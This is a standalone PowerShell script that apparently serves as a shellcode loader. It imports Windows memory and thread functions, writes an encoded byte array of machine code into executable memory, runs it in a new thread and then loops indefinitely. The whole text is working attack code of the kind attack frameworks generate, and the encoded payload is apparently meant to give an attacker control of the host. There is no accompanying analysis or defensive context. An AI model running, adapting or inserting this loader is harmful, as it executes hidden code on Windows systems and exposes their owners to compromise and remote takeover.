$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x63,0x74,0xff,0xf5,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x6b,0x0f,0x03,0x6b,0x6c,0x96,0x0a,0x09,0x9a,0xd4,0xf5,0xf2,0x5a,0xb9,0x7c,0x17,0x6b,0xf9,0x1b,0x53,0xdb,0xc9,0x68,0x31,0xd7,0xa2,0x3d,0xa2,0x6c,0xc6,0xe9,0xc5,0xc5,0x6d,0xcc,0xe8,0xd6,0xde,0x2c,0x6a,0x54,0x1d,0x61,0x4c,0x65,0xee,0x74,0x8d,0xa2,0x13,0x74,0xdf,0x7b,0x5f,0x2b,0xf0,0x08,0x15,0xf0,0x7b,0x42,0xbb,0x70,0x9f,0x12,0xba,0x51,0x0e,0x29,0xe5,0x71,0xb0,0xfe,0x9d,0x3b,0xaa,0xe3,0x98,0xf2,0x41,0xd7,0x57,0x05,0x80,0x26,0x97,0xaa,0xed,0x87,0x6a,0xb2,0x2a,0x2f,0x95,0xc1,0x42,0x4c,0x28,0xd2,0x90,0x2f,0xf6,0x57,0x03,0x97,0x7d,0xcf,0xef,0x26,0x51,0x96,0x64,0x24,0x1e,0xdc,0x23,0x28,0xa1,0x31,0x58,0x54,0x2a,0xb4,0x8f,0xdd,0x68,0x93,0x0b,0x86,0x2b,0xba,0x0a,0x62,0x9d,0xc3,0x4d,0xcd,0x42,0x66,0x05,0xe3,0x97,0x1b,0x44,0x6b,0x5b,0x16,0x77,0x6b,0xf3,0x21,0x04,0x59,0x5c,0x9a,0x82,0xd1,0x15,0x04,0x54,0x16,0x0c,0xf0,0xca,0xe9,0xaf,0x01,0xc2,0x2d,0xfb,0x51,0x7c,0x84,0x84,0x39,0x7c,0x29,0x51,0xed,0x2c,0x85,0x0a,0x4e,0x9d,0x65,0xfb,0x26,0xf7,0x6a,0x24,0x56,0xf8,0xa1,0x4d,0xfd,0x02,0x21,0xcc,0x3e,0x22,0x55,0x58,0x3d,0x3c,0x95,0xc9,0xc8,0xda,0xff,0xf9,0x9c,0x75,0x97,0x60,0x85,0x0e,0x06,0x6c,0x13,0x6b,0x08,0xe6,0x90,0x8b,0xc6,0x0f,0xdc,0x9f,0xbe,0xff,0xab,0xc2,0x68,0xff,0x01,0x68,0x94,0x95,0xad,0x3b,0xc3,0x01,0xac,0x1a,0x23,0x8e,0x4f,0x49,0x38,0x07,0xda,0x32,0x56,0x68,0x0a,0xb3,0xa6,0x3e,0x40,0xb3,0xce,0xe6,0x30,0xe0,0xeb,0xe8,0xec,0x94,0xa0,0x7c,0x0f,0xcd,0x15,0xd6,0x67,0xf3,0x40,0x10,0x28,0x0c,0xa7,0xa0,0x14,0xdb,0x81,0xd6,0x74,0xdf;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};